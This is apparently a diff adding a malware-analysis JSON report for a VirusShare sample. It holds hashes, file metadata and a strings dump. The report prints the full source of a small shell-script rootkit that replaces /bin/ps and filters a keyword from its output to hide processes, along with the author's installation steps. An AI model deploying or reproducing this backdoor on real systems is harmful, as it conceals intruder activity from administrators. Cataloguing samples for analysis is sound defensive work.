@@ -1,0 +1,64 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "output": "May write to a file"
+        },
+        "macro": "#!/bin/sh\n#\n# lame tiny easy to use backdoor for ps\n#\n# the word placed after filterword= will be filtered out of the output of ps\n#\n# usage:\n# # mv /bin/ps /bin/.ps\n# # cp ~/psbackdoor.sh /bin/ps\n# # chmod a+x /bin/ps\n#\n# Thats it, have phun scriptkiddies\n# The Itch / Bse / g0tr00t\n# http://bse.die.ms\n# http://www.g0tr00t.net\n\nfilterword=\"su\"\n\noriginalps=/bin/.ps\ntempfile=/tmp/.pstmp\ngrep=/bin/grep\nnumlines=0\n\ntouch $tempfile\n\nif [ ! -x $originalps ]; then\n\techo \"Error: original ps not found!\";\n\texit 1\nfi\n\nif [ ! -w $tempfile ]; then\n\techo \"Error: tempfile handling failed!\";\n\texit 1\nfi\n\n$originalps $1 $2 $3 $4| $grep -v $filterword > $tempfile\nnumlines=`cat $tempfile|wc -l`\nnumlines=`expr $numlines - 2`\nhead -n $numlines $tempfile\nrm -rf $tempfile\n"
+    },
+    "filename": "VirusShare_173efe14d58e49f0d33bf2003be6a3cb",
+    "filesize": 760,
+    "filetype": "POSIX shell script, ASCII text executable",
+    "hashes": {
+        "md5": "173efe14d58e49f0d33bf2003be6a3cb",
+        "sha1": "ccdf8b7df3d80a3f82b0f50a50a50ee13488672a",
+        "sha256": "d1db86bd8bb617a3fbc7c64f345756d192d895e94d28707e92043c6e0cfb46ed"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/bin/sh",
+            "# lame tiny easy to use backdoor for ps",
+            "# the word placed after filterword= will be filtered out of the output of ps",
+            "# usage:",
+            "# # mv /bin/ps /bin/.ps",
+            "# # cp ~/psbackdoor.sh /bin/ps",
+            "# # chmod a+x /bin/ps",
+            "# Thats it, have phun scriptkiddies",
+            "# The Itch / Bse / g0tr00t",
+            "# http://bse.die.ms",
+            "# http://www.g0tr00t.net",
+            "filterword=\"su\"",
+            "originalps=/bin/.ps",
+            "tempfile=/tmp/.pstmp",
+            "grep=/bin/grep",
+            "numlines=0",
+            "touch $tempfile",
+            "if [ ! -x $originalps ]; then",
+            "\techo \"Error: original ps not found!\";",
+            "\texit 1",
+            "if [ ! -w $tempfile ]; then",
+            "\techo \"Error: tempfile handling failed!\";",
+            "\texit 1",
+            "$originalps $1 $2 $3 $4| $grep -v $filterword > $tempfile",
+            "numlines=`cat $tempfile|wc -l`",
+            "numlines=`expr $numlines - 2`",
+            "head -n $numlines $tempfile",
+            "rm -rf $tempfile"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://bse.die.ms",
+            "http://www.g0tr00t.net"
+        ]
+    },
+    "time": "0:00:00.256121",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
